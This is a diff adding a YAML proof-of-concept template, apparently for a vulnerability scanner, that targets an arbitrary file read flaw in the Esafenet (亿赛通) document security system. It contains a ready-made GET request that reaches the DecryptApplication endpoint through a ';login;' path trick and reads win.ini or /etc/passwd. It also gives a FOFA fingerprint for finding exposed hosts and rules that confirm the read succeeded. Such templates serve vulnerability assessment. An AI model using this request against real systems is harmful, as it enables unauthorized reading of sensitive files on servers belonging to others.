@@ -1,0 +1,19 @@
+id: poc-yaml-yisaitong-esafenet-decryptapplication-anyfile-read
+info:
+  name: 亿赛通电子文档安全管理系统 DecryptApplication 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 亿赛通电子文档安全管理系统
+  fofa: app="亿赛通-电子文档安全管理系统"
+variables:
+  file: 'c:/windows/win.ini
+
+    /etc/passwd'
+requests:
+- method: GET
+  path: /CDGServer3/client/;login;/DecryptApplication?command=ViewUploadFile&filePath={{.file}}&uploadFileId=1&fileName1=ox9wcxwck7g1
+  expression: (status_code == 200 && !contains(body,"<")) && ( (contains(body,"; for
+    16-bit app support") && contains(body,"[files]")) || (contains(body,"root:") &&
+    contains(body,"/bin")) )
+transport: http
